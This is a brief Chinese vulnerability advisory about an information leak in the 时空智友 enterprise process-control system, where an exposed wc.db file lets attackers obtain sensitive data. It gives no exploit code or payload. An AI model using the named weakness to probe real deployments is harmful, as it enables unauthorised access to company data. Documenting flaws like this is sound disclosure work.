# 时空智友企业流程化管控系统 wc.db 文件信息泄露漏洞

# 一、漏洞简介
时空智友企业流程化管控系统是一个用于企业流程管理和控制的软件系统。它旨在帮助企业实现流程的规范化、自动化和优化，从而提高工作效率、降低成本并提升管理水平。时空智友企业流程化管控系统wc.db 信息泄露漏洞，攻击者可利用该漏洞获取系统的敏感信息等。

# 二、影响版本
+ 时空智友企业流程化管控系统
